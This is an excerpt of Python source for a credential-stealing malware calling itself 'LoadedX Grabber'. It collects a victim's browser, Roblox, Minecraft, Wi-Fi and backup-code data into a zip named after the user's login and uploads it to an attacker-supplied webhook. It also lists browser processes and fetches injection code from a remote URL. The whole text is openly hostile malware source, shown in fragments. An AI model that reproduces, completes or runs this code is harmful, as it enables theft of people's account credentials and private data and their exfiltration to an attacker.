...
def main(webhook: str):
    ...
    data = {
        "username": "LoadedX",
        "avatar_url": "https://static.independent.co.uk/s3fs-public/thumbnails/image/2010/05/04/11/365946.jpg"
    }

    _file = f'{localappdata}\\LoadedX-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'LoadedX-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'LoadedX-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "thumbnail": {
                        "url": "https://static.independent.co.uk/s3fs-public/thumbnails/image/2010/05/04/11/365946.jpg"
                    }
                }
            ],
            "username": "LoadedX",
                ...
                "embeds": [
                    {
                        ...
                        "footer": {
                            "text": "LoadedX Grabber | Created By Smug"
                        },
                    }
                ],
                "username": "LoadedX",
...
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "chromium.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/').text
